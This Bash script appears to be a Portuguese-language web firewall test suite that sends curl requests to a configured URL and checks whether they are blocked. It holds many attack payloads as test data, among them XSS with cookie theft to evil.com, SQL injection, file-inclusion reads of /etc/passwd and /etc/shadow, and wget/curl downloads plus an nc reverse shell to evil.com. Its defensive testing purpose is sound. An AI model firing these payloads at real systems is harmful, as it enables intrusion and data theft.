#!/bin/bash
#==============================================================================
# HTTP Header Security Testing Suite - EXPANDED VERSION
# Versão: 3.2.0
# Descrição: Script abrangente para testes de segurança de cabeçalhos HTTP
#==============================================================================

set -uo pipefail
VERSION="3.2.0"

# Cores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
NC='\033[0m'

# Variáveis globais
TOTAL_TESTS=0
PASSED_TESTS=0
FAILED_TESTS=0
VERBOSE=false
OUTPUT_FILE=""
URL=""
UA=""
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# User-Agents disponíveis
USER_AGENTS=(
    # Desktop - Chrome
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
    # Desktop - Firefox
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0"
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:134.0) Gecko/20100101 Firefox/134.0"
    # Desktop - Safari
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15"
    # Desktop - Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
    # Mobile - iPhone
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1"
    # Mobile - Android Chrome
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36"
    # Mobile - Android Samsung
    "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/25.0 Chrome/134.0.0.0 Mobile Safari/537.36"
    # Tablet - iPad
    "Mozilla/5.0 (iPad; CPU OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1"
    # Desktop - Opera
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 OPR/110.0.0.0"
    # Desktop - Brave
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Brave/134"
    # Desktop - Vivaldi
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Vivaldi/6.5.3206.63"
)

show_banner() {
    echo -e "${CYAN}"
    echo "╔═══════════════════════════════════════════════════════════════════════════╗"
    echo "║          HTTP Header Security Testing Suite v${VERSION} - EXPANDED        ║"
    echo "║                     500+ Security Tests Available                         ║"
    echo "╚═══════════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

test_curl() {
    local description="$1"
    local expected_behavior="$2"
    shift 2
    
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    local response
    response=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$@" 2>/dev/null)
    # Se curl falhar ou retornar vazio, usar 000
    [[ -z "$response" ]] && response="000"
    
    local status_icon color result_text
    
    if [ "$expected_behavior" == "allow" ]; then
        # Para requests que devem ser PERMITIDOS
        if [ "$response" == "200" ] || [ "$response" == "301" ] || [ "$response" == "302" ]; then
            color="${GREEN}"; status_icon="✓"; result_text="PASS"; PASSED_TESTS=$((PASSED_TESTS + 1))
        elif [[ "$response" =~ ^[45] ]] || [ "$response" == "000" ]; then
            color="${RED}"; status_icon="✗"; result_text="FAIL"; FAILED_TESTS=$((FAILED_TESTS + 1))
        else
            color="${YELLOW}"; status_icon="?"; result_text="WARN"
        fi
    else
        # Para requests que devem ser BLOQUEADOS
        # HTTP 000 = conexão fechada (Nginx 444) = BLOQUEIO BEM SUCEDIDO
        # HTTP 4xx (exceto 404) = BLOQUEIO BEM SUCEDIDO
        # HTTP 200 ou 404 = FALHA (não bloqueou)
        if [ "$response" == "000" ]; then
            color="${GREEN}"; status_icon="✓"; result_text="PASS (444)"; PASSED_TESTS=$((PASSED_TESTS + 1))
        elif [ "$response" == "200" ] || [ "$response" == "404" ]; then
            color="${RED}"; status_icon="✗"; result_text="FAIL"; FAILED_TESTS=$((FAILED_TESTS + 1))
        elif [[ "$response" =~ ^[45] ]]; then
            color="${GREEN}"; status_icon="✓"; result_text="PASS"; PASSED_TESTS=$((PASSED_TESTS + 1))
        else
            color="${YELLOW}"; status_icon="?"; result_text="WARN"
        fi
    fi
    
    printf "  ${color}[%s]${NC} %-55s ${color}%s${NC} (HTTP %s)\n" "$status_icon" "$description" "$result_text" "$response"
    [ -n "$OUTPUT_FILE" ] && echo "[${result_text}] ${description} - HTTP ${response}" >> "$OUTPUT_FILE"
}

print_section() {
    echo ""
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BOLD}${MAGENTA}$1${NC}"
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

print_subsection() {
    echo -e "\n  ${BOLD}${BLUE}▶ $1${NC}"
}

#==============================================================================
# TODOS OS MÉTODOS HTTP
#==============================================================================
test_all_http_methods() {
    print_section "📝 TESTES DE TODOS OS MÉTODOS HTTP"
    
    # Métodos padrão que devem funcionar
    print_subsection "Métodos Padrão (devem funcionar)"
    test_curl "GET" "allow" -A "$UA" -Lk -X GET "$URL"
    test_curl "HEAD" "allow" -A "$UA" -Lk -X HEAD "$URL"
    test_curl "POST" "allow" -A "$UA" -Lk -X POST "$URL"
    
    # Métodos que devem ser bloqueados
    print_subsection "Métodos Perigosos (devem ser bloqueados)"
    test_curl "PUT" "block" -A "$UA" -Lk -X PUT "$URL"
    test_curl "DELETE" "block" -A "$UA" -Lk -X DELETE "$URL"
    test_curl "PATCH" "block" -A "$UA" -Lk -X PATCH "$URL"
    test_curl "OPTIONS" "block" -A "$UA" -Lk -X OPTIONS "$URL"
    test_curl "TRACE" "block" -A "$UA" -Lk -X TRACE "$URL"
    test_curl "CONNECT" "block" -A "$UA" -Lk -X CONNECT "$URL"
    
    print_subsection "Métodos WebDAV (devem ser bloqueados)"
    test_curl "PROPFIND" "block" -A "$UA" -Lk -X PROPFIND "$URL"
    test_curl "PROPPATCH" "block" -A "$UA" -Lk -X PROPPATCH "$URL"
    test_curl "MKCOL" "block" -A "$UA" -Lk -X MKCOL "$URL"
    test_curl "COPY" "block" -A "$UA" -Lk -X COPY "$URL"
    test_curl "MOVE" "block" -A "$UA" -Lk -X MOVE "$URL"
    test_curl "LOCK" "block" -A "$UA" -Lk -X LOCK "$URL"
    test_curl "UNLOCK" "block" -A "$UA" -Lk -X UNLOCK "$URL"
    
    print_subsection "Métodos Extensão/Outros (devem ser bloqueados)"
    test_curl "SEARCH" "block" -A "$UA" -Lk -X SEARCH "$URL"
    test_curl "SUBSCRIBE" "block" -A "$UA" -Lk -X SUBSCRIBE "$URL"
    test_curl "UNSUBSCRIBE" "block" -A "$UA" -Lk -X UNSUBSCRIBE "$URL"
    test_curl "NOTIFY" "block" -A "$UA" -Lk -X NOTIFY "$URL"
    test_curl "REPORT" "block" -A "$UA" -Lk -X REPORT "$URL"
    test_curl "MKACTIVITY" "block" -A "$UA" -Lk -X MKACTIVITY "$URL"
    test_curl "CHECKOUT" "block" -A "$UA" -Lk -X CHECKOUT "$URL"
    test_curl "MERGE" "block" -A "$UA" -Lk -X MERGE "$URL"
    test_curl "BASELINE-CONTROL" "block" -A "$UA" -Lk -X BASELINE-CONTROL "$URL"
    test_curl "VERSION-CONTROL" "block" -A "$UA" -Lk -X VERSION-CONTROL "$URL"
    test_curl "ACL" "block" -A "$UA" -Lk -X ACL "$URL"
    test_curl "BIND" "block" -A "$UA" -Lk -X BIND "$URL"
    test_curl "UNBIND" "block" -A "$UA" -Lk -X UNBIND "$URL"
    test_curl "REBIND" "block" -A "$UA" -Lk -X REBIND "$URL"
    
    print_subsection "Métodos Inválidos/Maliciosos"
    test_curl "HACK" "block" -A "$UA" -Lk -X HACK "$URL"
    test_curl "SPAM" "block" -A "$UA" -Lk -X SPAM "$URL"
    test_curl "TEST" "block" -A "$UA" -Lk -X TEST "$URL"
    test_curl "DEBUG" "block" -A "$UA" -Lk -X DEBUG "$URL"
    test_curl "TRACK" "block" -A "$UA" -Lk -X TRACK "$URL"
}

#==============================================================================
# COOKIES MALICIOSOS - 10 DE CADA TIPO
#==============================================================================
test_malicious_cookies() {
    print_section "🍪 TESTES DE COOKIES MALICIOSOS (40 testes)"
    
    print_subsection "XSS via Cookie (10 variações)"
    test_curl "XSS: <script>alert(1)</script>" "block" -A "$UA" -Lk --cookie "x=<script>alert(1)</script>" "$URL"
    test_curl "XSS: <img src=x onerror=alert(1)>" "block" -A "$UA" -Lk --cookie "x=<img src=x onerror=alert(1)>" "$URL"
    test_curl "XSS: <svg onload=alert(1)>" "block" -A "$UA" -Lk --cookie "x=<svg onload=alert(1)>" "$URL"
    test_curl "XSS: <body onload=alert(1)>" "block" -A "$UA" -Lk --cookie "x=<body onload=alert(1)>" "$URL"
    test_curl "XSS: <iframe src=javascript:alert(1)>" "block" -A "$UA" -Lk --cookie "x=<iframe src=javascript:alert(1)>" "$URL"
    test_curl "XSS: javascript:alert(1)" "block" -A "$UA" -Lk --cookie "x=javascript:alert(1)" "$URL"
    test_curl "XSS: <div onmouseover=alert(1)>" "block" -A "$UA" -Lk --cookie "x=<div onmouseover=alert(1)>" "$URL"
    test_curl "XSS: URL encoded" "block" -A "$UA" -Lk --cookie "x=%3Cscript%3Ealert(1)%3C%2Fscript%3E" "$URL"
    test_curl "XSS: Double URL encoded" "block" -A "$UA" -Lk --cookie "x=%253Cscript%253Ealert(1)%253C%252Fscript%253E" "$URL"
    test_curl "XSS: Unicode encoded" "block" -A "$UA" -Lk --cookie "x=\\u003Cscript\\u003Ealert(1)" "$URL"

    print_subsection "SQL Injection via Cookie (10 variações)"
    test_curl "SQLi: ' OR '1'='1" "block" -A "$UA" -Lk --cookie "id=' OR '1'='1" "$URL"
    test_curl "SQLi: 1 OR 1=1--" "block" -A "$UA" -Lk --cookie "id=1 OR 1=1--" "$URL"
    test_curl "SQLi: UNION SELECT" "block" -A "$UA" -Lk --cookie "id=1 UNION SELECT * FROM users" "$URL"
    test_curl "SQLi: DROP TABLE" "block" -A "$UA" -Lk --cookie "id=1;DROP TABLE users;--" "$URL"
    test_curl "SQLi: INSERT INTO" "block" -A "$UA" -Lk --cookie "id=1;INSERT INTO users VALUES(1,'admin')--" "$URL"
    test_curl "SQLi: UPDATE SET" "block" -A "$UA" -Lk --cookie "id=1;UPDATE users SET admin=1--" "$URL"
    test_curl "SQLi: DELETE FROM" "block" -A "$UA" -Lk --cookie "id=1;DELETE FROM users--" "$URL"
    test_curl "SQLi: SLEEP(5)" "block" -A "$UA" -Lk --cookie "id=1 AND SLEEP(5)--" "$URL"
    test_curl "SQLi: BENCHMARK" "block" -A "$UA" -Lk --cookie "id=1 AND BENCHMARK(10000000,SHA1('test'))--" "$URL"
    test_curl "SQLi: WAITFOR DELAY" "block" -A "$UA" -Lk --cookie "id=1;WAITFOR DELAY '0:0:5'--" "$URL"

    print_subsection "Cookie Overflow (10 variações)"
    test_curl "Overflow: 1KB cookie" "block" -A "$UA" -Lk --cookie "x=$(head -c 1024 /dev/zero | tr '\0' 'A')" "$URL"
    test_curl "Overflow: 2KB cookie" "block" -A "$UA" -Lk --cookie "x=$(head -c 2048 /dev/zero | tr '\0' 'A')" "$URL"
    test_curl "Overflow: 4KB cookie" "block" -A "$UA" -Lk --cookie "x=$(head -c 4096 /dev/zero | tr '\0' 'A')" "$URL"
    test_curl "Overflow: 8KB cookie" "block" -A "$UA" -Lk --cookie "x=$(head -c 8192 /dev/zero | tr '\0' 'A')" "$URL"
    test_curl "Overflow: 16KB cookie" "block" -A "$UA" -Lk --cookie "x=$(head -c 16384 /dev/zero | tr '\0' 'A')" "$URL"
    test_curl "Overflow: 50 cookies pequenos" "block" -A "$UA" -Lk --cookie "$(for i in {1..50}; do echo -n "c$i=value$i;"; done)" "$URL"
    test_curl "Overflow: 100 cookies pequenos" "block" -A "$UA" -Lk --cookie "$(for i in {1..100}; do echo -n "c$i=v;"; done)" "$URL"
    test_curl "Overflow: Nome longo" "block" -A "$UA" -Lk --cookie "$(head -c 500 /dev/zero | tr '\0' 'A')=value" "$URL"
    test_curl "Overflow: Muitos =" "block" -A "$UA" -Lk --cookie "x=$(head -c 500 /dev/zero | tr '\0' '=')" "$URL"
    test_curl "Overflow: Muitos ;" "block" -A "$UA" -Lk --cookie "x=$(head -c 500 /dev/zero | tr '\0' ';')" "$URL"

    print_subsection "Encoding Attacks via Cookie (10 variações)"
    test_curl "Encoding: Null byte" "block" -A "$UA" -Lk --cookie "x=admin%00" "$URL"
    test_curl "Encoding: CRLF injection" "block" -A "$UA" -Lk --cookie $'x=test\r\nSet-Cookie: hacked=true' "$URL"
    test_curl "Encoding: Tab injection" "block" -A "$UA" -Lk --cookie $'x=test\tadmin' "$URL"
    test_curl "Encoding: Backspace" "block" -A "$UA" -Lk --cookie "x=admin%08%08%08guest" "$URL"
    test_curl "Encoding: UTF-7" "block" -A "$UA" -Lk --cookie "x=+ADw-script+AD4-alert(1)+ADw-/script+AD4-" "$URL"
    test_curl "Encoding: Hex encoded" "block" -A "$UA" -Lk --cookie "x=\x3cscript\x3ealert(1)\x3c/script\x3e" "$URL"
    test_curl "Encoding: Octal" "block" -A "$UA" -Lk --cookie "x=\\074script\\076alert\\050\\061\\051" "$URL"
    test_curl "Encoding: HTML entities" "block" -A "$UA" -Lk --cookie "x=&lt;script&gt;alert(1)&lt;/script&gt;" "$URL"
    test_curl "Encoding: Unicode bypass" "block" -A "$UA" -Lk --cookie "x=＜script＞alert(1)＜/script＞" "$URL"
    test_curl "Encoding: Mixed encoding" "block" -A "$UA" -Lk --cookie "x=%3c%53%43%52%49%50%54%3ealert(1)" "$URL"
}

#==============================================================================
# QUERY STRING MALICIOSA - 10 DE CADA TIPO
#==============================================================================
test_malicious_query() {
    print_section "🔍 TESTES DE QUERY STRING MALICIOSA (50 testes)"
    
    print_subsection "SQL Injection (10 variações)"
    test_curl "SQLi: OR 1=1" "block" -A "$UA" -Lk "${URL}?id=1%20OR%201=1"
    test_curl "SQLi: ' OR '1'='1" "block" -A "$UA" -Lk "${URL}?id=%27%20OR%20%271%27=%271"
    test_curl "SQLi: UNION SELECT" "block" -A "$UA" -Lk "${URL}?id=1%20UNION%20SELECT%20*%20FROM%20users"
    test_curl "SQLi: DROP TABLE" "block" -A "$UA" -Lk "${URL}?id=1;DROP%20TABLE%20users;--"
    test_curl "SQLi: SLEEP()" "block" -A "$UA" -Lk "${URL}?id=1%20AND%20SLEEP(5)"
    test_curl "SQLi: WAITFOR DELAY" "block" -A "$UA" -Lk "${URL}?id=1;WAITFOR%20DELAY%20%270:0:5%27"
    test_curl "SQLi: LOAD_FILE()" "block" -A "$UA" -Lk "${URL}?id=1%20UNION%20SELECT%20LOAD_FILE(%27/etc/passwd%27)"
    test_curl "SQLi: INTO OUTFILE" "block" -A "$UA" -Lk "${URL}?id=1%20INTO%20OUTFILE%20%27/tmp/test.txt%27"
    test_curl "SQLi: INFORMATION_SCHEMA" "block" -A "$UA" -Lk "${URL}?id=1%20UNION%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES"
    test_curl "SQLi: Blind boolean" "block" -A "$UA" -Lk "${URL}?id=1%20AND%201=1%20AND%20%27a%27=%27a"

    print_subsection "XSS Reflected (10 variações)"
    test_curl "XSS: <script>alert(1)</script>" "block" -A "$UA" -Lk "${URL}?q=<script>alert(1)</script>"
    test_curl "XSS: <img onerror>" "block" -A "$UA" -Lk "${URL}?q=<img%20src=x%20onerror=alert(1)>"
    test_curl "XSS: <svg onload>" "block" -A "$UA" -Lk "${URL}?q=<svg%20onload=alert(1)>"
    test_curl "XSS: javascript:" "block" -A "$UA" -Lk "${URL}?url=javascript:alert(1)"
    test_curl "XSS: data:text/html" "block" -A "$UA" -Lk "${URL}?url=data:text/html,<script>alert(1)</script>"
    test_curl "XSS: <body onload>" "block" -A "$UA" -Lk "${URL}?q=<body%20onload=alert(1)>"
    test_curl "XSS: <iframe src>" "block" -A "$UA" -Lk "${URL}?q=<iframe%20src=javascript:alert(1)>"
    test_curl "XSS: <input onfocus>" "block" -A "$UA" -Lk "${URL}?q=<input%20onfocus=alert(1)%20autofocus>"
    test_curl "XSS: <details ontoggle>" "block" -A "$UA" -Lk "${URL}?q=<details%20open%20ontoggle=alert(1)>"
    test_curl "XSS: DOM based" "block" -A "$UA" -Lk "${URL}?q=<script>document.location='http://evil.com/?c='+document.cookie</script>"

    print_subsection "LFI - Local File Inclusion (10 variações)"
    test_curl "LFI: ../etc/passwd" "block" -A "$UA" -Lk "${URL}?file=../../../etc/passwd"
    test_curl "LFI: Com null byte" "block" -A "$UA" -Lk "${URL}?file=../../../etc/passwd%00"
    test_curl "LFI: ....// bypass" "block" -A "$UA" -Lk "${URL}?file=....//....//....//etc/passwd"
    test_curl "LFI: ..%252f encoded" "block" -A "$UA" -Lk "${URL}?file=..%252f..%252f..%252fetc/passwd"
    test_curl "LFI: /proc/self/environ" "block" -A "$UA" -Lk "${URL}?file=/proc/self/environ"
    test_curl "LFI: /var/log/apache" "block" -A "$UA" -Lk "${URL}?file=/var/log/apache2/access.log"
    test_curl "LFI: php://filter" "block" -A "$UA" -Lk "${URL}?file=php://filter/convert.base64-encode/resource=index.php"
    test_curl "LFI: expect://" "block" -A "$UA" -Lk "${URL}?file=expect://id"
    test_curl "LFI: Windows path" "block" -A "$UA" -Lk "${URL}?file=C:\\windows\\system32\\drivers\\etc\\hosts"
    test_curl "LFI: /etc/shadow" "block" -A "$UA" -Lk "${URL}?file=../../../etc/shadow"

    print_subsection "RFI - Remote File Inclusion (10 variações)"
    test_curl "RFI: http://evil.com/shell.txt" "block" -A "$UA" -Lk "${URL}?file=http://evil.com/shell.txt"
    test_curl "RFI: https://evil.com/shell.php" "block" -A "$UA" -Lk "${URL}?file=https://evil.com/shell.php"
    test_curl "RFI: ftp://evil.com/shell" "block" -A "$UA" -Lk "${URL}?file=ftp://evil.com/shell.txt"
    test_curl "RFI: http://127.0.0.1" "block" -A "$UA" -Lk "${URL}?file=http://127.0.0.1/shell.php"
    test_curl "RFI: http://localhost" "block" -A "$UA" -Lk "${URL}?file=http://localhost/shell.php"
    test_curl "RFI: URL encoded" "block" -A "$UA" -Lk "${URL}?file=http%3A%2F%2Fevil.com%2Fshell.txt"
    test_curl "RFI: Double encoded" "block" -A "$UA" -Lk "${URL}?file=http%253A%252F%252Fevil.com%252Fshell.txt"
    test_curl "RFI: With null byte" "block" -A "$UA" -Lk "${URL}?file=http://evil.com/shell.txt%00"
    test_curl "RFI: data:// protocol" "block" -A "$UA" -Lk "${URL}?file=data://text/plain,<?php%20system('id');?>"
    test_curl "RFI: php://input" "block" -A "$UA" -Lk "${URL}?file=php://input"

    print_subsection "Command Injection (10 variações)"
    test_curl "CMDi: ; id" "block" -A "$UA" -Lk "${URL}?cmd=test;id"
    test_curl "CMDi: | id" "block" -A "$UA" -Lk "${URL}?cmd=test|id"
    test_curl "CMDi: || id" "block" -A "$UA" -Lk "${URL}?cmd=test||id"
    test_curl "CMDi: && id" "block" -A "$UA" -Lk "${URL}?cmd=test%26%26id"
    test_curl "CMDi: \`id\`" "block" -A "$UA" -Lk "${URL}?cmd=test\`id\`"
    test_curl "CMDi: \$(id)" "block" -A "$UA" -Lk "${URL}?cmd=test\$(id)"
    test_curl "CMDi: cat /etc/passwd" "block" -A "$UA" -Lk "${URL}?cmd=cat%20/etc/passwd"
    test_curl "CMDi: wget evil.com" "block" -A "$UA" -Lk "${URL}?cmd=wget%20http://evil.com/shell.sh"
    test_curl "CMDi: curl evil.com" "block" -A "$UA" -Lk "${URL}?cmd=curl%20http://evil.com/shell.sh"
    test_curl "CMDi: nc reverse shell" "block" -A "$UA" -Lk "${URL}?cmd=nc%20-e%20/bin/sh%20evil.com%204444"
}

#==============================================================================
# USER-AGENTS MALICIOSOS DA LISTA
#==============================================================================
test_bad_user_agents() {
    print_section "🤖 TESTES DE USER-AGENTS MALICIOSOS (100 da lista)"
    
    local list_file="${SCRIPT_DIR}/lists/bad-user-agents.txt"
    if [ ! -f "$list_file" ]; then
        echo -e "${RED}  Lista não encontrada: $list_file${NC}"
        return
    fi
    
    local count=0
    while IFS= read -r ua_bad || [ -n "$ua_bad" ]; do
        [ -z "$ua_bad" ] && continue
        [ "${ua_bad:0:1}" == "#" ] && continue
        count=$((count + 1))
        test_curl "Bad UA #$count: ${ua_bad:0:40}..." "block" -Lk -A "$ua_bad" "$URL"
        [ $count -ge 100 ] && break
    done < "$list_file"
}

#==============================================================================
# REFERERS SPAM (Tráfego falso, gambling, adulto)
#==============================================================================
test_referers_spam() {
    print_section "📧 TESTES DE REFERERS SPAM (Tráfego falso, gambling, adulto)"
    
    local list_file="${SCRIPT_DIR}/lists/referers-spam.txt"
    if [ ! -f "$list_file" ]; then
        echo -e "${RED}  Lista não encontrada: $list_file${NC}"
        return
    fi
    
    local count=0
    while IFS= read -r ref || [ -n "$ref" ]; do
        [ -z "$ref" ] && continue
        [ "${ref:0:1}" == "#" ] && continue
        count=$((count + 1))
        test_curl "SPAM Referer #$count: ${ref:0:35}..." "block" -A "$UA" -Lk -e "http://$ref" "$URL"
    done < "$list_file"
    
    echo -e "\n  ${CYAN}Total SPAM referers testados: $count${NC}"
}

#==============================================================================
# REFERERS SEO BLACK HAT (Manipulação de rankings)
#==============================================================================
test_referers_seo_blackhat() {
    print_section "🎩 TESTES DE REFERERS SEO BLACK HAT (Manipulação de rankings)"
    
    local list_file="${SCRIPT_DIR}/lists/referers-seo-blackhat.txt"
    if [ ! -f "$list_file" ]; then
        echo -e "${RED}  Lista não encontrada: $list_file${NC}"
        return
    fi
    
    local count=0
    while IFS= read -r ref || [ -n "$ref" ]; do
        [ -z "$ref" ] && continue
        [ "${ref:0:1}" == "#" ] && continue
        count=$((count + 1))
        test_curl "SEO BlackHat #$count: ${ref:0:35}..." "block" -A "$UA" -Lk -e "http://$ref" "$URL"
    done < "$list_file"
    
    echo -e "\n  ${CYAN}Total SEO Black Hat referers testados: $count${NC}"
}

#==============================================================================
# REFERERS INJECTION (Bots falsos, XSS, SQLi, CMDi via referer)
#==============================================================================
test_referers_injection() {
    print_section "💉 TESTES DE REFERERS INJECTION (Bots falsos e payloads)"
    
    local list_file="${SCRIPT_DIR}/lists/referers-injection.txt"
    if [ ! -f "$list_file" ]; then
        echo -e "${RED}  Lista não encontrada: $list_file${NC}"
        return
    fi
    
    local count=0
    while IFS= read -r ref || [ -n "$ref" ]; do
        [ -z "$ref" ] && continue
        [ "${ref:0:1}" == "#" ] && continue
        count=$((count + 1))
        # Para injection, alguns são URLs completas, outros são payloads
        if [[ "$ref" == http* ]] || [[ "$ref" == javascript:* ]] || [[ "$ref" == data:* ]] || [[ "$ref" == file:* ]] || [[ "$ref" == ftp:* ]]; then
            test_curl "Injection Referer #$count: ${ref:0:35}..." "block" -A "$UA" -Lk -e "$ref" "$URL"
        else
            test_curl "Injection Referer #$count: ${ref:0:35}..." "block" -A "$UA" -Lk -e "http://$ref" "$URL"
        fi
    done < "$list_file"
    
    echo -e "\n  ${CYAN}Total Injection referers testados: $count${NC}"
}

#==============================================================================
# WRAPPER: TODOS OS REFERERS MALICIOSOS
#==============================================================================
test_bad_referers() {
    test_referers_spam
    test_referers_seo_blackhat
    test_referers_injection
}

#==============================================================================
# BOTS LEGÍTIMOS
#==============================================================================
test_good_bots() {
    print_section "✅ TESTES DE BOTS LEGÍTIMOS (devem passar)"
    
    test_curl "Googlebot Mobile" "allow" -Lk -A "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X) AppleWebKit/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "$URL"
    test_curl "Googlebot Desktop" "allow" -Lk -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "$URL"
    test_curl "Bingbot" "allow" -Lk -A "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "$URL"
    test_curl "DuckDuckBot" "allow" -Lk -A "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)" "$URL"
    test_curl "Facebot" "allow" -Lk -A "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "$URL"
    test_curl "Twitterbot" "allow" -Lk -A "Twitterbot/1.0" "$URL"
    test_curl "LinkedInBot" "allow" -Lk -A "LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com)" "$URL"
    test_curl "Slackbot" "allow" -Lk -A "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)" "$URL"
    test_curl "WhatsApp" "allow" -Lk -A "WhatsApp/2.23.20.0" "$URL"
    test_curl "Telegrambot" "allow" -Lk -A "TelegramBot (like TwitterBot)" "$URL"
}

#==============================================================================
# FAKE BOTS - Bots que se passam por Google/Bing (devem ser BLOQUEADOS)
#==============================================================================
test_fake_bots() {
    print_section "🎭 TESTES DE FAKE BOTS (Impostores - devem ser BLOQUEADOS)"
    
    echo -e "  ${YELLOW}ℹ️  Estes são bots FALSOS que tentam se passar por crawlers legítimos${NC}"
    echo -e "  ${YELLOW}   Servidores bem configurados devem verificar o IP de origem e bloquear${NC}"
    echo ""
    
    # Fake Googlebot - usando User-Agent real mas de IP não autorizado
    test_curl "FAKE Googlebot Mobile" "block" -Lk -A "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "$URL"
    test_curl "FAKE Googlebot Desktop" "block" -Lk -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "$URL"
    test_curl "FAKE Googlebot-Image" "block" -Lk -A "Googlebot-Image/1.0" "$URL"
    test_curl "FAKE Googlebot-News" "block" -Lk -A "Googlebot-News" "$URL"
    test_curl "FAKE Googlebot-Video" "block" -Lk -A "Googlebot-Video/1.0" "$URL"
    
    # Fake Bingbot
    test_curl "FAKE Bingbot" "block" -Lk -A "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "$URL"
    test_curl "FAKE Bingbot Mobile" "block" -Lk -A "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "$URL"
    test_curl "FAKE MSNBot" "block" -Lk -A "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "$URL"
    
    # Fake outros bots famosos
    test_curl "FAKE YandexBot" "block" -Lk -A "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "$URL"
    test_curl "FAKE Baiduspider" "block" -Lk -A "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "$URL"
}

#==============================================================================
# HOSTS INVÁLIDOS (10 testes)
#==============================================================================
test_invalid_host() {
    print_section "🏠 TESTES DE HOST INVÁLIDO"
    
    test_curl "Host: 127.0.0.1" "block" -A "$UA" -Lk -H "Host: 127.0.0.1" "$URL"
    test_curl "Host: localhost" "block" -A "$UA" -Lk -H "Host: localhost" "$URL"
    test_curl "Host: vazio" "block" -A "$UA" -Lk -H "Host: " "$URL"
    test_curl "Host: [::1] (IPv6)" "block" -A "$UA" -Lk -H "Host: [::1]" "$URL"
    test_curl "Host: 0.0.0.0" "block" -A "$UA" -Lk -H "Host: 0.0.0.0" "$URL"
    test_curl "Host: 169.254.169.254 (AWS)" "block" -A "$UA" -Lk -H "Host: 169.254.169.254" "$URL"
    test_curl "Host: evil.com" "block" -A "$UA" -Lk -H "Host: evil.com" "$URL"
    test_curl "Host: interno.local" "block" -A "$UA" -Lk -H "Host: interno.local" "$URL"
    test_curl "Host: 10.0.0.1" "block" -A "$UA" -Lk -H "Host: 10.0.0.1" "$URL"
    test_curl "Host: 192.168.1.1" "block" -A "$UA" -Lk -H "Host: 192.168.1.1" "$URL"
}

#==============================================================================
# URI MALICIOSA (10 testes)
#==============================================================================
test_malicious_uri() {
    print_section "🔗 TESTES DE URI MALICIOSA - WORDPRESS (50 testes)"
    
    print_subsection "Arquivos de Configuração WordPress"
